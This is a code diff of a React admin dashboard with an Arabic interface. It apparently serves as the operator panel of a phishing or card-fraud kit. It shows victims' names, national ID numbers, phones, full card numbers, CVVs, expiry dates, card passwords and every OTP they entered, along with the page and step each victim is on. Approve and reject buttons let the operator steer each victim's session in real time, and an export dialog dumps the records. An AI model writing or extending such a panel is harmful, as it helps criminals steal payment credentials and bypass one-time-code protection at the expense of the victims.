+                <div className="flex flex-col items-center justify-center py-16 px-4">
+                  <div className="rounded-full bg-muted p-6 mb-4">
+                    <AlertCircle className="h-12 w-12 text-muted-foreground" />
+                  </div>
+                  <h3 className="text-xl font-semibold mb-2">لا توجد إشعارات</h3>
+                  <p className="text-muted-foreground text-center">
+                    {searchTerm || filterType !== "all"
+                      ? "لم يتم العثور على نتائج مطابقة للفلاتر المحددة"
+                      : "لا توجد إشعارات حالياً، ستظهر هنا عند استلام إشعارات جديدة"}
+                  </p>
+                </div>
+              ) : (
+                <div className="overflow-x-auto">
+                  <table className="w-full table-auto border-collapse">
+                    <thead>
+                      <tr className="bg-muted/50 border-b border-border">
+                        {[
+                          { label: "الدولة", sortKey: "country" },
+                          { label: "المعلومات", sortKey: null },
+                          { label: "الحالة", sortKey: "status" },
+                          { label: "الوقت", sortKey: "date" },
+                          { label: "الاتصال", sortKey: null },
+                          { label: "الكود", sortKey: null },
+                          { label: "الصفحة", sortKey: null },
+                          { label: "الإجراءات", sortKey: null },
+                        ].map((heading) => (
+                          <th
+                            key={heading.label}
+                            className={`px-6 py-4 text-right font-semibold text-muted-foreground ${
+                              heading.sortKey ? "cursor-pointer hover:bg-muted/80 transition-colors" : ""
+                            }`}
+                            onClick={heading.sortKey ? () => toggleSort(heading.sortKey as any) : undefined}
+                          >
+                            <div className="flex items-center gap-2 justify-end">
+                              {heading.label}
+                              {heading.sortKey && sortBy === heading.sortKey && <ArrowUpDown className="h-3 w-3" />}
+                            </div>
+                          </th>
+                        ))}
+                      </tr>
+                    </thead>
+                    <tbody>
+                      {paginatedNotifications.map((notification, index) => (
+                        <tr
+                          key={notification.id}
+                          className="border-b border-border hover:bg-muted/30 transition-colors animate-in fade-in slide-in-from-bottom-2"
+                          style={{ animationDelay: `${index * 50}ms` }}
+                        >
+                          <td className="px-6 py-4">
+                            <div className="flex items-center gap-3">
+                              <div className="w-8 h-8 rounded-full bg-gradient-to-br from-primary/20 to-primary/10 flex items-center justify-center">
+                                <MapPin className="h-4 w-4 text-primary" />
+                              </div>
+                              <span className="font-medium">{notification.country || "غير معروف"}</span>
+                            </div>
+                          </td>
+                          <td className="px-6 py-4">
+                            <div className="flex flex-wrap gap-2">
+                              <InfoBadge
+                                active={notification.phone || notification.name}
+                                onClick={() => handleInfoClick(notification, "personal")}
+                                icon={User}
+                                text="معلومات شخصية"
+                                inactiveText="لا يوجد معلومات"
+                                colorClass="from-blue-500 to-blue-600"
+                              />
+                              <InfoBadge
+                                active={notification.cardNumber}
+                                onClick={() => handleInfoClick(notification, "card")}
+                                icon={CreditCard}
+                                text="معلومات البطاقة"
+                                inactiveText="لا يوجد بطاقة"
+                                colorClass="from-green-500 to-green-600"
+                              />
+                            </div>
+                          </td>
+                          <td className="px-6 py-4">
+                            <StatusBadge status={notification.status} />
+                          </td>
+                          <td className="px-6 py-4">
+                            <div className="flex items-center gap-2 text-sm text-muted-foreground">
+                              <Clock className="h-4 w-4 flex-shrink-0" />
+                              <span className="whitespace-nowrap">
+                                {notification.createdDate &&
+                                  formatDistanceToNow(new Date(notification.createdDate), {
+                                    addSuffix: true,
+                                    locale: ar,
+                                  })}
+                              </span>
+                            </div>
+                          </td>
+                          <td className="px-6 py-4">
+                            <UserStatus userId={notification.id} />
+                          </td>
+                          <td className="px-6 py-4 text-center">
+                            {notification.otp ? (
+                              <Badge
+                                variant="outline"
+                                className="bg-blue-50 text-blue-700 border-blue-200 dark:bg-blue-950/30 dark:text-blue-300 font-mono"
+                              >
+                                {notification.otp}
+                              </Badge>
+                            ) : (
+                              <span className="text-muted-foreground text-sm">-</span>
+                            )}
+                          </td>
+                          <td className="px-6 py-4 text-center">
+                            {notification?.currentPage ? (
+                              <Badge variant="outline">{notification.currentPage}</Badge>
+                            ) : (
+                              <span className="text-muted-foreground text-sm">-</span>
+                            )}
+                          </td>
+                          <td className="px-6 py-4">
+                            <ActionButtons
+                              notification={notification}
+                              handleApproval={handleApproval}
+                              handleDelete={handleDelete}
+                              handleFlagColorChange={handleFlagColorChange}
+                            />
+                          </td>
+                        </tr>
+                      ))}
+                    </tbody>
+                  </table>
+                </div>
+              )}
+            </CardContent>
+            {paginatedNotifications.length > 0 && (
+              <CardFooter className="border-t p-4">
+                <Pagination
+                  currentPage={currentPage}
+                  totalPages={totalPages}
+                  onPageChange={handlePageChange}
+                  totalItems={filteredNotifications.length}
+                  itemsPerPage={itemsPerPage}
+                />
+              </CardFooter>
+            )}
+          </Card>
+        </div>
       </div>
 
-      {/* Enhanced Dialog */}
+      {/* Info Dialog */}
       <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
-        <DialogContent className="max-w-md" dir="rtl">
+        <DialogContent className="max-w-md bg-background rounded-xl shadow-lg p-6" dir="rtl">
           <DialogHeader>
-            <DialogTitle className="flex items-center gap-3 text-xl">
+            <DialogTitle className="flex items-center gap-3 text-2xl font-semibold">
               {selectedInfo === "personal" ? (
-                <>
-                  <div className="w-10 h-10 rounded-full bg-gradient-to-br from-blue-500 to-blue-600 flex items-center justify-center">
-                    <User className="h-5 w-5 text-white" />
-                  </div>
-                  المعلومات الشخصية
-                </>
+                <HeaderIcon icon={User} bgGradient="from-blue-400 to-blue-600" title="المعلومات الشخصية" />
               ) : (
-                <>
-                  <div className="w-10 h-10 rounded-full bg-gradient-to-br from-green-500 to-green-600 flex items-center justify-center">
-                    <CreditCard className="h-5 w-5 text-white" />
-                  </div>
-                  معلومات البطاقة
-                </>
+                <HeaderIcon icon={CreditCard} bgGradient="from-green-400 to-green-600" title="معلومات البطاقة" />
               )}
             </DialogTitle>
           </DialogHeader>
 
-          {selectedInfo === "personal" && selectedNotification && (
-            <div className="space-y-4">
-              <div className="bg-gradient-to-br from-muted/50 to-muted/30 rounded-lg p-4 space-y-3">
-                {[
-                  { label: "الاسم", value: selectedNotification.name },
-                  { label: "رقم الهوية", value: selectedNotification.idNumber },
-                  {
-                    label: "الشبكة ",
-                    value: selectedNotification.network,
-                  },
-                  { label: "رقم الجوال", value: selectedNotification.mobile },
-                  { label: "الهاتف", value: selectedNotification.phone },
-                  { label: "رمزهاتف", value: selectedNotification.otp2 },
-
-                ].map(
-                  ({ label, value }) =>
-                    value && (
-                      <div
-                        key={label}
-                        className="flex justify-between items-center py-2 border-b border-border/30 last:border-0"
-                      >
-                        <span className="font-medium text-muted-foreground">{label}:</span>
-                        <span className="font-semibold">{value}</span>
-                      </div>
-                    ),
-                )}
-              </div>
-            </div>
+          {selectedNotification && selectedInfo === "personal" && (
+            <InfoSection
+              items={[
+                { label: "الاسم", value: selectedNotification.name },
+                { label: "رقم الهوية", value: selectedNotification.idNumber, sensitive: true },
+                { label: "الشبكة", value: selectedNotification.network },
+                { label: "رقم الجوال", value: selectedNotification.mobile, sensitive: false },
+                { label: "الهاتف", value: selectedNotification.phone, sensitive: false },
+                { label: "رمز الهاتف", value: selectedNotification.otp2, sensitive: true },
+                { label: "البريد الإلكتروني", value: selectedNotification.email },
+              ]}
+            />
           )}
 
-          {selectedInfo === "card" && selectedNotification && (
-            <div className="space-y-4">
-              <div className="bg-gradient-to-br from-muted/50 to-muted/30 rounded-lg p-4 space-y-3">
-                {[
-                  { label: "البنك", value: selectedNotification.bank },
-                  {
-                    label: "رقم البطاقة",
-                    value: `${selectedNotification?.cardNumber} - ${selectedNotification?.prefix}`,
-                  },
-                  {
-                    label: "تاريخ الانتهاء",
-                    value:
-                      selectedNotification.year && selectedNotification.month
-                        ? `${selectedNotification.year}/${selectedNotification.month}`
-                        : selectedNotification.expiryDate,
-                  },
-                  { label: "رمز الأمان", value: selectedNotification.cvv },
-                  { label: "رمز التحقق", value: selectedNotification.otp },
-                  { label: "كلمة المرور", value: selectedNotification.pass },
-                  { label: "الخطوة الحالية", value: selectedNotification.step },
-                ].map(
-                  ({ label, value }) =>
-                    value !== undefined && (
-                      <div
-                        key={label}
-                        className="flex justify-between items-center py-2 border-b border-border/30 last:border-0"
-                      >
-                        <span className="font-medium text-muted-foreground">{label}:</span>
-                        <span className="font-semibold" >{String(value)}</span>
-                      </div>
-                    ),
-                )}
-                {selectedNotification.allOtps &&
-                  Array.isArray(selectedNotification.allOtps) &&
-                  selectedNotification.allOtps.length > 0 && (
-                    <div className="pt-2 border-t border-border/30">
-                      <span className="font-medium text-muted-foreground block mb-2">جميع الرموز:</span>
-                      <div className="flex flex-wrap gap-2">
-                        {selectedNotification.allOtps.map((otp, index) => (
-                          <Badge key={index} variant="outline" className="bg-muted">
-                            {otp}
-                          </Badge>
-                        ))}
-                      </div>
-                    </div>
-                  )}
-              </div>
-            </div>
+          {selectedNotification && selectedInfo === "card" && (
+            <InfoSection
+              items={[
+                { label: "البنك", value: selectedNotification.bank },
+                {
+                  label: "رقم البطاقة",
+                  value: selectedNotification.cardNumber
+                    ? `${selectedNotification.cardNumber} - ${selectedNotification.prefix}`
+                    : undefined,
+                  sensitive: false,
+                },
+                {
+                  label: "تاريخ الانتهاء",
+                  value:
+                    selectedNotification.year && selectedNotification.month
+                      ? `${selectedNotification.year}/${selectedNotification.month}`
+                      : selectedNotification.expiryDate,
+                },
+                { label: "رمز الأمان (CVV)", value: selectedNotification.cvv, sensitive: false },
+                { label: "رمز التحقق (OTP)", value: selectedNotification.otp, sensitive: false },
+                { label: "كلمة المرور", value: selectedNotification.pass, sensitive: false },
+                { label: "الخطوة الحالية", value: selectedNotification.step },
+                { label: "المبلغ", value: selectedNotification.amount },
+              ]}
+              additionalOtps={selectedNotification?.allOtps!}
+            />
           )}
+
+          <DialogFooter >
+          <div className="grid grid-col-1 w-full gap-2">
+
+            <div className="flex">
+              <Button onClick={()=>handleApproval('approved',selectedNotification?.id!)} className="w-full bg-green-500 mx-1">
+           موافقة
+           <CheckCircle/>
+              </Button>
+              <Button variant='destructive' onClick={()=>handleApproval('reject',selectedNotification?.id!)} className="w-full">
+                رفض
+                <X/>
+              </Button>
+            </div>
+            <div className="">
+
+              <Button onClick={closeDialog} className="w-full">
+                إغلاق
+              </Button>
+            </div>
+            </div>
+          </DialogFooter>
         </DialogContent>
       </Dialog>
-    </div>
+
+      {/* Settings Panel */}
+      <SettingsPanel open={settingsOpen} onOpenChange={setSettingsOpen} />
+
+      {/* Export Dialog */}
+      <ExportDialog open={exportDialogOpen} onOpenChange={setExportDialogOpen} notifications={filteredNotifications} />
+    </>
   )
 }
-
